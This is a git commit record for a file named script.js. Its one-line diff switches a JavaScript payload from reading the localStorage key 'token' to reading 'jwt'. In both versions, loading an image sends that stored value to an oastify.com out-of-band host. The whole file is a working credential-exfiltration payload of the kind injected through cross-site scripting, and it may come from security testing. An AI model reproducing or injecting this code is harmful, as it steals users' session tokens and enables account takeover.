b81f380669a3c9012281eb54832bb6dcc4941868
ClearGate-Int <129657113+ClearGate-Int@users.noreply.github.com>
2024-06-30 09:58:57 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-var img; img=new Image; img.src="https://mh7y5it8z3nxcsbmwo77onjpcgi76y3ms.oastify.com/token?" + localStorage.getItem('token');
+var img; img=new Image; img.src="https://mh7y5it8z3nxcsbmwo77onjpcgi76y3ms.oastify.com/token?" + localStorage.getItem('jwt');
